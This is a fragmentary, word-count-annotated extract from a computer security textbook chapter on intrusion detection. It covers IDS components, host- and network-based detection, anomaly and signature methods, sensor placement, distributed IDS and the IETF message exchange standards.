• Exploit any vulnerable application to gain elevated privileges.
[Word Count: 9]

• Install sniffers to capture administrator passwords.
[Word Count: 7]

• Use captured administrator password to access privileged information.
[Word Count: 9]

(d) Information Gathering or System Exploit
[Word Count: 6]

• Transfer large numbers of documents to external repository.
[Word Count: 9]

• Use guessed or captured passwords to access other servers on network.
[Word Count: 12]

• Install remote administration tool or rootkit with backdoor for later access.
[Word Count: 12]

• Use administrator password to later access network.
[Word Count: 8]

• Modify or disable anti-virus or IDS programs running on system.
[Word Count: 11]

• Use rootkit to hide files installed on system.
[Word Count: 9]

• Edit logfiles to remove entries generated during the intrusion.
[Word Count: 10]

An IDS comprises three logical components:
[Word Count: 6]

• Sensors: Sensors are responsible for collecting data. The input for a sensor
[Word Count: 13]

may be any part of a system that could contain evidence of an intrusion. Types 
of input to a sensor includes network packets, log files, and system call traces. 
Sensors collect and forward this information to the analyzer.
 
• Analyzers: Analyzers receive input from one or more sensors or from other
[Word Count: 51]

analyzers. The analyzer is responsible for determining if an intrusion has 
occurred. The output of this component is an indication that an intrusion has 
occurred. The output may include evidence supporting the conclusion that an 
intrusion occurred. The analyzer may provide guidance about what actions 
to take as a result of the intrusion. The sensor inputs may also be stored for 
future analysis and review in a storage or database component.
[Word Count: 71]

Security Intrusion: A security event, or a combination of multiple ­security events, 
that constitutes a security incident in which an intruder gains, or ­attempts to gain, 
access to a system (or system resource) without having ­authorization to do so.
Intrusion Detection: A security service that monitors and analyzes ­system events 
for the purpose of finding, and providing real-time or near ­real-time warning of, 
attempts to access system resources in an unauthorized manner.
[Word Count: 72]

The following definitions from RFC 2828 (Internet Security Glossary) are relevant 
to our discussion:
[Word Count: 14]

• User interface: The user interface to an IDS enables a user to view output
[Word Count: 15]

from the system or control the behavior of the system. In some systems, the 
user interface may equate to a manager, director, or console component.
[Word Count: 25]

An IDS may use a single sensor and analyzer, such as a classic HIDS on a host 
or NIDS in a firewall device. More sophisticated IDSs can use multiple sensors, 
across a range of host and network devices, sending information to a centralised 
analyzer and user interface in a distributed architecture.
[Word Count: 51]

IDSs are often classified based on the source and type of data analyzed, as:
[Word Count: 14]

• Host-based IDS (HIDS): Monitors the characteristics of a single host and the
[Word Count: 13]

events occurring within that host, such as process identifiers and the system 
calls they make, for evidence of suspicious activity.
 
• Network-based IDS (NIDS): Monitors network traffic for particular network
[Word Count: 30]

segments or devices and analyzes network, transport, and application proto-
cols to identify suspicious activity.
 
• Distributed or hybrid IDS: Combines information from a number of sensors,
[Word Count: 27]

often both host and network-based, in a central analyzer that is able to better 
identify and respond to intrusion activity.
[Word Count: 20]

Authentication facilities, access control facilities, and firewalls all play a role in 
countering intrusions. Another line of defense is intrusion detection, and this has 
been the focus of much research in recent years. This interest is motivated by a 
number of considerations, including the following:
[Word Count: 45]

1.	 If an intrusion is detected quickly enough, the intruder can be identified and
[Word Count: 14]

ejected from the system before any damage is done or any data are compro-
mised. Even if the detection is not sufficiently timely to preempt the intruder, 
the sooner that the intrusion is detected, the less the amount of damage and 
the more quickly that recovery can be achieved.
	
2.	 An effective IDS can serve as a deterrent, thus acting to prevent intrusions.
	
3.	 Intrusion detection enables the collection of information about intrusion tech-
[Word Count: 74]

niques that can be used to strengthen intrusion prevention measures.
[Word Count: 10]

Intrusion detection is based on the assumption that the behavior of the intruder 
differs from that of a legitimate user in ways that can be quantified. Of course, we 
cannot expect that there will be a crisp, exact distinction between an attack by an 
intruder and the normal use of resources by an authorized user. Rather, we must 
expect that there will be some overlap.
[Word Count: 65]

and art in the practice of intrusion detection. Ideally you want an IDS to have a high 
detection rate, that is, the ratio of detected to total attacks, while minimizing the 
false alarm rate, the ratio of incorrectly classified to total normal usage [LAZA05].
[Word Count: 44]

To be of practical use, an IDS should detect a substantial percentage of intru-
sions while keeping the false alarm rate at an acceptable level. If only a modest 
percentage of actual intrusions are detected, the system provides a false sense of 
security. On the other hand, if the system frequently triggers an alert when there 
is no ­intrusion (a false alarm), then either system managers will begin to ignore the 
alarms, or much time will be wasted analyzing the false alarms.
[Word Count: 82]

Unfortunately, because of the nature of the probabilities involved, it is very 
difficult to meet the standard of high rate of detections with a low rate of false 
alarms. In general, if the actual numbers of intrusions is low compared to the num-
ber of legitimate uses of a system, then the false alarm rate will be high unless the
[Word Count: 60]

Overlap in observed
or expected behavior
[Word Count: 6]

Figure 8.1  Profiles of Behavior of Intruders and Authorized Users
[Word Count: 10]

test is extremely discriminating. This is an example of a phenomenon known as 
the base-rate fallacy. A study of existing IDSs, reported in [AXEL00], indicated 
that current systems have not overcome the problem of the base-rate fallacy. See 
Appendix J for a brief background on the mathematics of this problem.
[Word Count: 50]

[BALA98] lists the following as desirable for an IDS. It must
[Word Count: 11]

• Run continually with minimal human supervision.
 
• Be fault tolerant in the sense that it must be able to recover from system
[Word Count: 23]

crashes and reinitializations.
 
• Resist subversion. The IDS must be able to monitor itself and detect if it has
[Word Count: 19]

been modified by an attacker.
 
• Impose a minimal overhead on the system where it is running.
 
• Be able to be configured according to the security policies of the system that is
[Word Count: 33]

being monitored.
 
• Be able to adapt to changes in system and user behavior over time.
 
• Be able to scale to monitor a large number of hosts.
 
• Provide graceful degradation of service in the sense that if some components
[Word Count: 41]

of the IDS stop working for any reason, the rest of them should be affected as 
little as possible.
 
• Allow dynamic reconfiguration; that is, the ability to reconfigure the IDS
[Word Count: 31]

IDSs typically use one of the following alternative approaches to analyze sensor 
data to detect intrusions:
[Word Count: 16]

1.	 Anomaly detection: Involves the collection of data relating to the behavior
[Word Count: 12]

of legitimate users over a period of time. Then current observed behavior is 
analyzed to determine with a high level of confidence whether this behavior is 
that of a legitimate user or alternatively that of an intruder.
	
2.	 Signature or Heuristic detection: Uses a set of known malicious data patterns
[Word Count: 50]

(signatures) or attack rules (heuristics) that are compared with current behav-
ior to decide if is that of an intruder. It is also known as misuse detection. This 
approach can only identify known attacks for which it has patterns or rules.
[Word Count: 41]

In essence, anomaly approaches aim to define normal, or expected, behavior, in 
order to identify malicious or unauthorized behavior. Signature or heuristic-based 
approaches directly define malicious or unauthorized behavior. They can quickly 
and efficiently identify known attacks. However only anomaly detection is able to 
detect unknown, zero-day attacks, as it starts with known good behavior and identi-
fies anomalies to it. Given this advantage, clearly anomaly detection would be the 
preferred approach, were it not for the difficulty in collecting and analyzing the data 
required, and the high level of false alarms, as we discuss in the following sections.
[Word Count: 99]

The anomaly detection approach involves first developing a model of legitimate 
user behavior by collecting and processing sensor data from the normal operation 
of the monitored system in a training phase. This may occur at distinct times, or 
there may be a continuous process of monitoring and evolving the model over time. 
Once this model exists, current observed behavior is compared with the model in 
order to classify it as either legitimate or anomalous activity in a detection phase.
[Word Count: 79]

A variety of classification approaches are used, which [GARC09] broadly cat-
egorized as:
[Word Count: 13]

• Statistical:  Analysis of the observed behavior using univariate, multivariate,
[Word Count: 10]

or time-series models of observed metrics.
 
• Knowledge based:  Approaches use an expert system that classifies observed
[Word Count: 17]

behavior according to a set of rules that model legitimate behavior.
 
• Machine-learning:  Approaches automatically determine a suitable classifica-
[Word Count: 19]

tion model from the training data using data mining techniques.
[Word Count: 10]

They also note two key issues that affect the relative performance of these alterna-
tives, being the efficiency and cost of the detection process.
[Word Count: 24]

The monitored data is first parameterized into desired standard metrics that 
will then be analyzed. This step ensures that data gathered from a variety of pos-
sible sources is provided in standard form for analysis.
[Word Count: 35]

Machine-learning approaches use data mining techniques to automatically 
develop a model using the labeled normal training data. This model is then able 
to classify subsequently observed data as either normal or anomalous. A key dis-
advantage is that this process typically requires significant time and computational 
resources. Once the model is generated however, subsequent analysis is generally 
fairly efficient.
[Word Count: 59]

A variety of machine-learning approaches have been tried, with varying success. 
These include:
[Word Count: 13]

• Bayesian networks:  Encode probabilistic relationships among observed metrics.
 
• Markov models:  Develop a model with sets of states, some possibly hidden,
[Word Count: 22]

interconnected by transition probabilities.
 
• Neural networks:  Simulate human brain operation with neurons and synapse
[Word Count: 15]

between them, that classify observed data.
 
• Fuzzy logic:  Uses fuzzy set theory where reasoning is approximate, and can
[Word Count: 19]

accommodate uncertainty.
 
• Genetic algorithms:  Uses techniques inspired by evolutionary biology, includ-
[Word Count: 12]

ing inheritance, mutation, selection and recombination, to develop classifica-
tion rules.
 
• Clustering and outlier detection:  Group the observed data into clusters based
[Word Count: 23]

on some similarity or distance measure, and then identify subsequent data as 
either belonging to a cluster or as an outlier.
[Word Count: 21]

The advantages of the machine-learning approaches include their flexibility, adapt-
ability, and ability to capture interdependencies between the observed metrics. 
Their disadvantages include their dependency on assumptions about accepted 
behavior for a system, their currently unacceptably high false alarm rate, and their 
high resource cost.
[Word Count: 45]

A key limitation of anomaly detection approaches used by IDSs, particularly 
the machine-learning approaches, is that they are generally only trained with legit-
imate data, unlike many of the other applications surveyed in [CHAN09] where 
both legitimate and anomalous training data is used. The lack of anomalous train-
ing data, which occurs given the desire to detect currently unknown future attacks, 
limits the effectiveness of some of the techniques listed above.
[Word Count: 71]

Signature or heuristic techniques detect intrusion by observing events in the sys-
tem and applying either a set of signature patterns to the data, or a set of rules that 
characterize the data, leading to a decision regarding whether the observed data 
indicates normal or anomalous behavior.
[Word Count: 47]

Rule-based heuristic identification involves the use of rules for identifying 
known penetrations or penetrations that would exploit known weaknesses. Rules 
can also be defined that identify suspicious behavior, even when the behavior is
[Word Count: 33]

within the bounds of established patterns of usage. Typically, the rules used in 
these systems are specific to the machine and operating system. The most fruitful 
approach to developing such rules is to analyze attack tools and scripts collected on 
the Internet. These rules can be supplemented with rules generated by knowledge-
able security personnel. In this latter case, the normal procedure is to interview 
system administrators and security analysts to collect a suite of known penetration 
scenarios and key events that threaten the security of the target system.
[Word Count: 89]

The SNORT system, which we discuss later in Section 8.9 is an example of a 
rule-based NIDS. A large collection of rules exists for it to detect a wide variety of 
network attacks.
[Word Count: 33]

Host-based IDSs (HIDSs) add a specialized layer of security software to vulnerable 
or sensitive systems; such as database servers and administrative systems. The HIDS 
monitors activity on the system in a variety of ways to detect suspicious behavior. 
In some cases, an IDS can halt an attack before any damage is done, as we discuss 
in Section 9.6, but its main purpose is to detect intrusions, log suspicious events, and 
send alerts.
[Word Count: 72]

The primary benefit of a HIDS is that it can detect both external and internal 
intrusions, something that is not possible either with network-based IDSs or fire-
walls. As we discuss in the previous section, host-based IDSs can use either anomaly 
or signature and heuristic approaches to detect unauthorized behavior on the moni-
tored host. We now review some common data sources and sensors used in HIDS, 
and then continue with a discussion of how the anomaly, signature and heuristic 
approaches are used in HIDS, and then consider distributed HIDS.
[Word Count: 90]

As noted previously, a fundamental component of intrusion detection is the sensor 
that collects data. Some record of ongoing activity by users must be provided as 
input to the analysis component of the IDS. Common data sources include:
[Word Count: 38]

• System call traces:  A record of the sequence of systems calls by processes on
[Word Count: 15]

a system, is widely acknowledged as the preferred data source for HIDS since 
the pioneering work of Forrest [CREE13]. While these work well on Unix and 
Linux systems, they are problematic on Windows systems due to the extensive 
use of DLLs that obscure which processes use specific system calls.
 
• Audit (log file) records1:  Most modern operating systems include accounting
[Word Count: 60]

software that collects information on user activity. The advantage of using this 
information is that no additional collection software is needed. The disadvantages 
are that the audit records may not contain the needed information or may not
[Word Count: 37]

1Audit records play a more general role in computer security than just intrusion detection. See Chapter 18 
for a full discussion.
[Word Count: 21]

8.4 / Host-Based Intrusion Detection   279
[Word Count: 6]

contain it in a convenient form, and that intruders may attempt to manipulate 
these records to hide their actions.
 
• File integrity checksums:  A common approach to detecting intruder activity
[Word Count: 30]

on a system is to periodically scan critical files for changes from the desired 
baseline, by comparing a current cryptographic checksums for these files, with 
a record of known good values. Disadvantages include the need to generate 
and protect the checksums using known good files, and the difficulty monitor-
ing changing files. Tripwire is a well-known system using this approach.
 
• Registry access:  An approach used on Windows systems is to monitor access
[Word Count: 73]

to the registry, given the amount of information and access to it used by pro-
grams on these systems. However this source is very Windows specific, and 
has recorded limited success.
[Word Count: 31]

The sensor gathers data from the chosen source, filters the gathered data to 
remove any unwanted information and to standardize the information format, and 
forwards the result to the IDS analyzer, which may be local or remote.
[Word Count: 37]

The system call traces are then analyzed by a suitable decision engine. 
[CREE13] notes that the original work by Forrest et al introduced the Sequence 
Time-Delay Embedding (STIDE) algorithm, based on artificial immune system 
approaches, that compares observed sequences of system calls with sequences from 
the training phase to obtain a mismatch ratio that determines whether the sequence 
is normal or not. Later work has used other alternatives, such as Hidden Markov 
Models (HMM), Artificial Neural Networks (ANN), Support Vector Machines 
(SVM), or Extreme Learning Machines (ELM) to make this classification.
[Word Count: 91]

[CREE13] notes that these approaches all report providing reasonable 
intruder detection rates of 95-99% while having false positive rates of less than 5%, 
though on older test datasets. He updates these results using recent contemporary 
data and example attacks, with a more extensive feature extraction process from the 
system call traces and an ELM decision engine capable of a very high detection rate 
while maintaining reasonable false positive rates. This approach should lead to even 
more effective production HIDS products in the near future.
[Word Count: 84]

Windows systems have traditionally not used anomaly based HIDS, as the 
wide usage of Dynamic Link Libraries (DLLs) as an intermediary between pro-
cess requests for operating system functions and the actual system call interface, has
[Word Count: 36]

Table 8.2  Linux System Calls and Windows DLLs Monitored
[Word Count: 9]

comctl32
kernel32
msvcpp
msvcrt
mswsock
ntdll
ntoskrnl
user32
ws2_32
[Word Count: 9]

While using system call traces provides arguably the richest information source 
for a HIDS, it does impose a moderate load on the monitored system to gather and 
classify this data. And as we noted earlier, the training phase for many of the deci-
sion engines requires very significant time and computational resources. Hence oth-
ers have trialed approaches based on audit (log) records. However these both have 
a lower detection rate than the system call trace approaches (80% reported), and 
are more susceptible to intruder manipulation.
[Word Count: 86]

8.4 / Host-Based Intrusion Detection   281
[Word Count: 6]

The alternative of signature or heuristic based HIDS is widely used, particularly as 
seen in anti-virus (A/V), more correctly viewed as anti-malware, products. These 
are very commonly used on Windows systems, and also incorporated into mail and 
web application proxies on firewalls and in network based IDSs. They use either 
a database of file signatures, which are patterns of data found in known malicious 
software, or heuristic rules that characterize known malicious behavior.
[Word Count: 73]

These products are quite efficient at detecting known malware, however 
they are not capable of detecting zero-day attacks that do not correspond to the 
known signatures or heuristic rules. They are widely used, particularly on Windows 
systems, which continue to be targeted by intruders, as we discuss in Section 6.9.
[Word Count: 50]

Traditionally, work on host-based IDSs focused on single-system stand-alone oper-
ation. The typical organization, however, needs to defend a distributed collection 
of hosts supported by a LAN or internetwork. Although it is possible to mount a 
defense by using stand-alone IDSs on each host, a more effective defense can be 
achieved by coordination and cooperation among IDSs across the network.
[Word Count: 60]

Porras points out the following major issues in the design of a distributed IDS 
[PORR92]:
[Word Count: 15]

• A distributed IDS may need to deal with different sensor data formats. In a
[Word Count: 15]

heterogeneous environment, different systems may use different sensors and 
approaches to gathering data for intrusion detection use.
 
• One or more nodes in the network will serve as collection and analysis points
[Word Count: 32]

for the data from the systems on the network. Thus, either raw sensor data or 
summary data must be transmitted across the network. Therefore, there is a 
requirement to assure the integrity and confidentiality of these data. Integrity 
is required to prevent an intruder from masking his or her activities by alter-
ing the transmitted audit information. Confidentiality is required because the 
transmitted audit information could be valuable.
[Word Count: 68]

• Either a centralized or decentralized architecture can be used. With a central-
[Word Count: 13]

ized architecture, there is a single central point of collection and analysis of all 
sensor data. This eases the task of correlating incoming reports but creates a 
potential bottleneck and single point of failure. With a decentralized architec-
ture, there is more than one analysis center, but these must coordinate their 
activities and exchange information.
[Word Count: 55]

A good example of a distributed IDS is one developed at the University of 
California at Davis [HEBE92, SNAP91]; a similar approach has been taken for a 
project at Purdue [SPAF00, BALA98]. Figure 8.2 shows the overall architecture, 
which consists of three main components:
[Word Count: 44]

1.	 Host agent module: An audit collection module operating as a background
[Word Count: 12]

process on a monitored system. Its purpose is to collect data on security-­
related events on the host and transmit these to the central manager. Figure 8.3 
shows details of the agent module architecture.
	
2.	 LAN monitor agent module: Operates in the same fashion as a host agent
[Word Count: 48]

module except that it analyzes LAN traffic and reports the results to the cen-
tral manager.
	
3.	 Central manager module: Receives reports from LAN monitor and host
[Word Count: 27]

agents and processes and correlates these reports to detect intrusion.
[Word Count: 10]

The scheme is designed to be independent of any operating system or system 
auditing implementation. Figure 8.3 shows the general approach that is taken. The 
agent captures each audit record produced by the native audit collection system. A 
filter is applied that retains only those records that are of security interest. These 
records are then reformatted into a standardized format referred to as the host
[Word Count: 65]

Figure 8.2  Architecture for Distributed Intrusion Detection
[Word Count: 7]

8.5 / Network-Based Intrusion Detection   283
[Word Count: 6]

audit record (HAR). Next, a template-driven logic module analyzes the records for 
suspicious activity. At the lowest level, the agent scans for notable events that are 
of interest independent of any past events. Examples include failed files, accessing 
system files, and changing a file’s access control. At the next higher level, the agent 
looks for sequences of events, such as known attack patterns (signatures). Finally, 
the agent looks for anomalous behavior of an individual user based on a historical 
profile of that user, such as number of programs executed, number of files accessed, 
and the like.
[Word Count: 96]

When suspicious activity is detected, an alert is sent to the central manager. 
The central manager includes an expert system that can draw inferences from 
received data. The manager may also query individual systems for copies of HARs 
to correlate with those from other agents.
[Word Count: 45]

The LAN monitor agent also supplies information to the central manager. 
The LAN monitor agent audits host-host connections, services used, and volume of 
traffic. It searches for significant events, such as sudden changes in network load, 
the use of security-related services, and suspicious network activities.
[Word Count: 45]

The architecture depicted in Figures 8.2 and 8.3 is quite general and flexible. 
It offers a foundation for a machine-independent approach that can expand from 
stand-alone intrusion detection to a system that is able to correlate activity from 
a number of sites and networks to detect suspicious activity that would otherwise 
remain undetected.
[Word Count: 53]

A network-based IDS (NIDS) monitors traffic at selected points on a network or 
interconnected set of networks. The NIDS examines the traffic packet by packet in 
real time, or close to real time, to attempt to detect intrusion patterns. The NIDS 
may examine network-, transport-, and/or application-level protocol activity. Note 
the contrast with a host-based IDS; a NIDS examines packet traffic directed toward
[Word Count: 63]

Notable
activity;
signatures;
noteworthy
[Word Count: 4]

potentially vulnerable computer systems on a network. A host-based system exam-
ines user and software activity on a host.
[Word Count: 19]

More commonly, passive sensors are used. A passive sensor monitors a 
copy of network traffic; the actual traffic does not pass through the device. From 
the point of view of traffic flow, the passive sensor is more efficient than the 
inline sensor, because it does not add an extra handling step that contributes to 
packet delay.
[Word Count: 56]

8.5 / Network-Based Intrusion Detection   285
[Word Count: 6]

Monitoring interface
(no IP, promiscuous mode)
[Word Count: 6]

Consider an organization with multiple sites, each of which has one or more LANs, 
with all of the networks interconnected via the Internet or some other WAN 
­technology. For a comprehensive NIDS strategy, one or more sensors are needed 
at each site. Within a single site, a key decision for the security administrator is the 
placement of the sensors.
[Word Count: 59]

Figure 8.5 illustrates a number of possibilities. In general terms, this configuration 
is typical of larger organizations. All Internet traffic passes through an external firewall 
that protects the entire facility.2 Traffic from the outside world, such as customers and 
vendors that need access to public services, such as Web and mail, is monitored. The 
external firewall also provides a degree of protection for those parts of the network 
that should only be accessible by users from other corporate sites. Internal firewalls 
may also be used to provide more specific protection to certain parts of the network.
[Word Count: 96]

A common location for a NIDS sensor is just inside the external firewall 
(­location 1 in the figure). This position has a number of advantages:
[Word Count: 25]

• Sees attacks, originating from the outside world, that penetrate the network’s
[Word Count: 12]

perimeter defenses (external firewall).
 
• Highlights problems with the network firewall policy or performance.
 
• Sees attacks that might target the Web server or ftp server.
 
• Even if the incoming attack is not recognized, the IDS can sometimes ­recognize
[Word Count: 40]

the outgoing traffic that results from the compromised server.
[Word Count: 9]

2Firewalls are discussed in detail in Chapter 9. In essence, a firewall is designed to protect one or a 
­connected set of networks on the inside of the firewall from Internet and other traffic from outside the 
firewall. The firewall does this by restricting traffic, rejecting potentially threatening packets.
[Word Count: 49]

Instead of placing a NIDS sensor inside the external firewall, the security 
administrator may choose to place a NIDS sensor between the external firewall and 
the Internet or WAN (location 2). In this position, the sensor can monitor all net-
work traffic, unfiltered. The advantages of this approach are as follows:
[Word Count: 51]

• Documents number of attacks originating on the Internet that target the network.
 
• Documents types of attacks originating on the Internet that target the network.
[Word Count: 26]

A sensor at location 2 has a higher processing burden than any sensor located 
elsewhere on the site network.
[Word Count: 19]

In addition to a sensor at the boundary of the network, on either side of the 
external firewall, the administrator may configure a firewall and one or more sen-
sors to protect major backbone networks, such as those that support internal serv-
ers and database resources (location 3). The benefits of this placement include the 
following:
[Word Count: 56]

• Monitors a large amount of a network’s traffic, thus increasing the possibility
[Word Count: 13]

of spotting attacks.
 
• Detects unauthorized activity by authorized users within the organization’s
[Word Count: 13]

Thus, a sensor at location 3 is able to monitor for both internal and external 
attacks. Because the sensor monitors traffic to only a subset of devices at the site, 
it can be tuned to specific protocols and attack types, thus reducing the processing 
burden.
[Word Count: 45]

Figure 8.5  Example of NIDS Sensor Deployment
[Word Count: 7]

8.5 / Network-Based Intrusion Detection   287
[Word Count: 6]

Finally, the network facilities at a site may include separate LANs that sup-
port user workstations and servers specific to a single department. The administra-
tor could configure a firewall and NIDS sensor to provide additional protection for 
all of these networks or target the protection to critical subsystems, such as person-
nel and financial networks (location 4). A sensor used in this latter fashion provides 
the following benefits:
[Word Count: 69]

• Detects attacks targeting critical systems and resources.
 
• Allows focusing of limited resources to the network assets considered of
[Word Count: 20]

As with a sensor at location 3, a sensor at location 4 can be tuned to specific 
protocols and attack types, thus reducing the processing burden.
[Word Count: 26]

As with host-based intrusion detection, network-based intrusion detection makes 
use of signature detection and anomaly detection. Unlike the case with HIDS, a 
number of commercial anomaly NIDS products are available [GARC09]. One of 
the best known is the Statistical Packet Anomaly Detection Engine (SPADE), 
available as a plug-in for  the Snort system that we discuss later.
[Word Count: 56]

Signature Detection  [SCAR12] lists the following as examples of that types of 
attacks that are suitable for signature detection:
[Word Count: 19]

• Application layer reconnaissance and attacks: Most NIDS technologies
[Word Count: 9]

traffic and perhaps other transport layer protocols. Examples of attacks are 
unusual packet fragmentation, scans for vulnerable ports, and TCP-specific 
attacks such as SYN floods.
 
• Network layer reconnaissance and attacks: NIDSs typically analyze IPv4, IPv6,
[Word Count: 36]

ICMP, and IGMP at this level. Examples of attacks are spoofed IP addresses 
and illegal IP header values.
 
• Unexpected application services: The NIDS attempts to determine if the
[Word Count: 29]

activity on a transport connection is consistent with the expected application 
protocol. An example is a host running an unauthorized application service.
 
• Policy violations: Examples include use of inappropriate Web sites and use of
[Word Count: 35]

Anomaly Detection Techniques  [SCAR07] lists the following as examples of 
the types of attacks that are suitable for anomaly detection:
[Word Count: 20]

• Denial-of-service (DoS) attacks:  Such attacks involve either significantly
[Word Count: 9]

­increased packet traffic or significantly increase connection attempts, in an 
­attempt to overwhelm the target system. These attacks are analyzed in Chapter 7. 
Anomaly ­detection is well suited to such attacks.
	
•	 Scanning: A scanning attack occurs when an attacker probes a target network
[Word Count: 44]

or system by sending different kinds of packets. Using the responses received 
from the target, the attacker can learn many of the system’s characteristics and 
vulnerabilities. Thus, a scanning attack acts as a target identification tool for 
an attacker. Scanning can be detected by atypical flow patterns at the applica-
tion layer (e.g., banner grabbing3), transport layer (e.g., TCP and UDP port 
scanning), and network layer (e.g., ICMP scanning).
 
• Worms: Worms4 spreading among hosts can be detected in more than one
[Word Count: 82]

way. Some worms propagate quickly and use large amounts of bandwidth. 
Worms can also be detected because they can cause hosts to communicate 
with each other that typically do not, and they can also cause hosts to use ports 
that they normally do not use. Many worms also perform scanning. Chapter 6 
discusses worms in detail.
[Word Count: 56]

Stateful Protocol Analysis (Spa)  [SCAR12] details this subset of anomaly 
detection that compares observed network traffic against predetermined universal 
vendor supplied profiles of benign protocol traffic. This distinguishes it from anomaly 
techniques trained with organization specific traffic profiles. SPA understands and 
tracks network, transport, and application protocol states to ensure they progress as 
expected. A key disadvantage of SPA is the high resource use it requires.
[Word Count: 66]

When a sensor detects a potential violation, it sends an alert and logs information 
related to the event. The NIDS analysis module can use this information to refine 
intrusion detection parameters and algorithms. The security administrator can use 
this information to design prevention techniques. Typical information logged by a 
NIDS sensor includes the following:
[Word Count: 54]

• Timestamp (usually date and time)
 
• Connection or session ID (typically a consecutive or unique number assigned to
[Word Count: 19]

each TCP connection or to like groups of packets for connectionless protocols)
 
• Event or alert type
[Word Count: 17]

3Typically, banner grabbing consists of initiating a connection to a network server and recording the data 
that is returned at the beginning of the session. This information can specify the name of the application, 
version number, and even the operating system that is running the server [DAMR03].
4A worm is a program that can replicate itself and send copies from computer to computer across ­network 
connections. Upon arrival, the worm may be activated to replicate and propagate again. In addition to 
propagation, the worm usually performs some unwanted function.
[Word Count: 89]

8.6 / Distributed OR HYBRID Intrusion Detection   289
[Word Count: 8]

• Rating (e.g., priority, severity, impact, confidence)
 
• Network, transport, and application layer protocols
 
• Source and destination IP addresses
 
• Source and destination TCP or UDP ports, or ICMP types and codes
 
• Number of bytes transmitted over the connection
 
• Decoded payload data, such as application requests and responses
 
• State-related information (e.g., authenticated username)
[Word Count: 57]

8.6	 Distributed OR HYBRID Intrusion Detection
[Word Count: 6]

Attackers have exploited these problems in several ways. The more traditional 
attack approach is to develop worms and other malicious software that spreads ever more 
rapidly and to develop other attacks (such as DoS attacks) that strike with overwhelming 
force before a defense can be mounted. This style of attack is still prevalent. But more 
recently, attackers have added a quite different approach: Slow the spread of the attack so 
that it will be more difficult to detect by conventional algorithms [ANTH07].
[Word Count: 82]

An example of this approach is a scheme developed by Intel and referred to 
as autonomic enterprise security [AGOS06]. Figure 8.6 illustrates the approach.
[Word Count: 24]

This approach does not rely solely on perimeter defense mechanisms, such as 
firewalls, or on individual host-based defenses. Instead, each end host and each 
­network device (e.g., routers) is considered to be a potential sensor and may have 
the sensor ­software module installed. The sensors in this distributed configuration 
can exchange information to corroborate the state of the network (i.e., whether an 
attack is under way).
[Word Count: 66]

The Intel designers provide the following motivation for this approach:
[Word Count: 10]

1.	 IDSs deployed selectively may miss a network-based attack or may be slow
[Word Count: 13]

to recognize that an attack is under way. The use of multiple IDSs that 
share ­information has been shown to provide greater coverage and more 
rapid response to attacks, especially slowly growing attacks (e.g., [BAIL05], 
[RAJA05]).
	
2.	 Analysis of network traffic at the host level provides an environment in which
[Word Count: 50]

there is much less network traffic than found at a network device such as a 
router. Thus, attack patterns will stand out more, providing in effect a higher 
signal-to-noise ratio.
	
3.	 Host-based detectors can make use of a richer set of data, possibly using
[Word Count: 44]

­application data from the host as input into the local classifier.
[Word Count: 11]

PEP = policy enforcement point
DDI = distributed detection and inference
[Word Count: 11]

Figure 8.6  Overall Architecture of an Autonomic Enterprise Security System
[Word Count: 10]

8.7 / Intrusion Detection Exchange Format   291
[Word Count: 7]

We now summarize the principal elements of this approach, illustrated in Fig-
ure 8.6. A central system is configured with a default set of security policies. Based 
on input from distributed sensors, these policies are adapted and specific actions 
are communicated to the various platforms in the distributed system. The device-
specific policies may include immediate actions to take or parameter settings to be 
adjusted. The central system also communicates collaborative policies to all plat-
forms that adjust the timing and content of collaborative gossip messages. Three 
types of input guide the actions of the central system:
[Word Count: 97]

• Summary events: Events from various sources are collected by intermediate
[Word Count: 11]

collection points such as firewalls, IDSs, or servers that serve a specific seg-
ment of the enterprise network. These events are summarized for delivery to 
the central policy system.
 
• DDI events: Distributed detection and inference (DDI) events are alerts that
[Word Count: 41]

are generated when the gossip traffic enables a platform to conclude that an 
attack is under way.
 
• PEP events: Policy enforcement points (PEPs) reside on trusted, self-­
[Word Count: 28]

defending platforms and intelligent IDSs. These systems correlate distributed 
information, local decisions, and individual device actions to detect intrusions 
that may not be evident at the host level.
[Word Count: 28]

8.7	 Intrusion Detection Exchange Format
[Word Count: 5]

To facilitate the development of distributed IDSs that can function across a wide 
range of platforms and environments, standards are needed to support interop-
erability. Such standards are the focus of the IETF Intrusion Detection Working 
Group. The purpose of the working group is to define data formats and exchange 
procedures for sharing information of interest to intrusion detection and response
[Word Count: 61]

systems and to management systems that may need to interact with them. The 
­working group issued the following RFCs in 2007:
[Word Count: 21]

• Intrusion Detection Message Exchange Requirements (RFC 4766): This
[Word Count: 9]

­document defines requirements for the Intrusion Detection Message 
Exchange Format (IDMEF). The document also specifies requirements for a 
communication protocol for communicating IDMEF.
 
• The Intrusion Detection Message Exchange Format (RFC 4765): This
[Word Count: 33]

­document describes a data model to represent information exported by 
intrusion detection systems and explains the rationale for using this model. 
An implementation of the data model in the Extensible Markup Language 
(XML) is presented, an XML Document Type Definition is developed, and 
examples are provided.
 
• The Intrusion Detection Exchange Protocol (RFC 4767): This ­document
[Word Count: 56]

­describes the Intrusion Detection Exchange Protocol (IDXP), an 
­application-level protocol for exchanging data between intrusion detection 
entities. IDXP supports mutual-authentication, integrity, and confidentiality 
over a ­connection-oriented protocol.
[Word Count: 27]

Figure 8.7 illustrates the key elements of the model on which the intrusion 
detection message exchange approach is based. This model does not correspond
[Word Count: 24]

Figure 8.7  Model for Intrusion Detection Message Exchange
[Word Count: 8]

8.7 / Intrusion Detection Exchange Format   293
[Word Count: 7]

to any particular product or implementation, but its functional components are the 
key elements of any IDS. The functional components are as follows:
[Word Count: 23]

• Data source: The raw data that an IDS uses to detect unauthorized or ­undesired
[Word Count: 15]

activity. Common data sources include network packets, operating system 
­audit logs, application audit logs, and system-generated checksum data.
 
• Sensor: Collects data from the data source. The sensor forwards events to the
[Word Count: 32]

analyzer.
 
• Analyzer: The ID component or process that analyzes the data collected by
[Word Count: 14]

the sensor for signs of unauthorized or undesired activity or for events that 
might be of interest to the security administrator. In many existing IDSs, the 
sensor and the analyzer are part of the same component.
 
• Administrator: The human with overall responsibility for setting the ­security
[Word Count: 47]

policy of the organization, and, thus, for decisions about deploying and 
­configuring the IDS. This may or may not be the same person as the ­operator 
of the IDS. In some organizations, the administrator is associated with the 
network or systems administration groups. In other organizations, it is an 
­independent position.
 
• Manager: The ID component or process from which the operator manages
[Word Count: 63]

the various components of the ID system. Management functions typically 
include sensor configuration, analyzer configuration, event notification man-
agement, data consolidation, and reporting.
 
• Operator: The human that is the primary user of the IDS manager. The opera-
[Word Count: 38]

tor often monitors the output of the IDS and initiates or recommends further 
action.
